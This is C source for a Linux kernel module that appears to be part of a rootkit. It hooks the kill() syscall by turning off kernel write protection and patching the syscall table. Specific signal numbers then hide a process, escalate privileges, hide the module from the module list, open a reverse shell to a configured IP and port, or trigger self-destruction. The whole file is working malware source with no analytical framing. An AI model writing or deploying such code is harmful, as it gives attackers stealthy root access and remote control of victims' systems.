#include <linux/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>

#include "h_kill.h"
#include "../hooking.h"
#include "../revshell.h"
#include "../selfdestruct.h"

#define PF_INVISIBLE 0x10000000

static sysfun_t old_kill;
static struct list_head *module_previous;
int module_hidden = 0;

struct task_struct *find_task(pid_t pid)
{
    struct task_struct *p = current;
    for_each_process(p) {
        if (p->pid == pid)
            return p;
    }
    return NULL;
}


int new_kill(const struct pt_regs *pt_regs)
{
    pid_t pid = (pid_t) pt_regs->di;
    int sig = (int) pt_regs->si;

    struct task_struct *task;

    switch (sig) {
        case SIGINVIS:
            if ((task = find_task(pid)) == NULL)
                return -ESRCH;
            task->flags ^= PF_INVISIBLE;
            break;
        case SIGSUPER:
            privesc();
            break;
        case SIGMODINVIS:
            if (module_hidden)
                module_show();
            else
                module_hide();
            break;
        case SIGNAL_REVERSE_SHELL:
            start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
            break;
        case SIGDESTRUCT:
            module_show();
            kboom_persistence();
            kboom();
            printk(KERN_INFO "CALL SELFDESTRUCT WITH SIG");
            break;
        default:
        return old_kill(pt_regs);
    }
    return 0;
}

void hijack_kill(void) {
    unsigned long old_cr0 = unprotect_memory();

    old_kill = (sysfun_t)syscall_table[__NR_kill];
    m_printd(KERN_INFO "Old kill @ %p", old_kill);

    syscall_table[__NR_kill] = (uint64_t)new_kill;
    m_printd(KERN_INFO "Hooked kill(), new kill @ %p", &syscall_table[__NR_kill]);
    protect_memory(old_cr0);
}

void module_show(void)
{
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
}

void module_hide(void)
{
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

void restore_kill(void) {
    unsigned long old_cr0 = unprotect_memory();
    syscall_table[__NR_kill] = (uint64_t)old_kill;
    protect_memory(old_cr0);
}

int is_module_hidden() { return module_hidden; }
